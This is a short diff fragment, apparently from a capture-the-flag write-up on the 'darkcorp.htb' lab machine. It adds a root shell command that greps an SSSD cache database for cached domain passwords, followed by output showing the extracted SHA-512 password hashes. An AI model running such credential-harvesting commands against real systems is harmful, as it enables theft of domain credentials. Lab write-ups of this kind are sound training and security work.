@@ -1315,7 +1315,11 @@ root@drip:/var/lib/sss/db#
 
 Ill have a look through some of these files
 
-```
+```python
+root@drip:/var/lib/sss/db# cat cache_darkcorp.htb.ldb | grep -a 'cachedPassword'
+1789068860initgrExpireTimestamp0memberofAname=Domain Users@darkcorp.htb,cn=groups,cn=darkcorp.htb,cn=sysdbccacheFile"FILE:/tmp/krb5cc_1730401105_e6TfYScachedPasswordj$6$cyKiP3FHinOP63vG$1GF26r27xAXyH8enqLxsUrzf45dh5xK3U2hm9gIuYKCnqGB8VAxPHS55K8.XjbtdrVTSyPdG1wiV7o/CxibDH1cachedPasswordType1lastCachedPasswordChange
+1789068860initgrExpireTimestamp0memberofAname=Domain Users@darkcorp.htb,cn=groups,cn=darkcorp.htb,cn=sysdbccacheFile"FILE:/tmp/krb5cc_1730401105_e6TfYScachedPasswordj$6$cyKiP3FHinOP63vG$1GF26r27xAXyH8enqLxsUrzf45dh5xK3U2hm9gIuYKCnqGB8VAxPHS55K8.XjbtdrVTSyPdG1wiV7o/CxibDH1cachedPasswordType1lastCachedPasswordChange
+1736373877initgrExpireTimestamp0ccacheFile"FILE:/tmp/krb5cc_1730414101_B5njULcachedPasswordj$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.cachedPasswordType1lastCachedPasswordChange
 ```
 
 
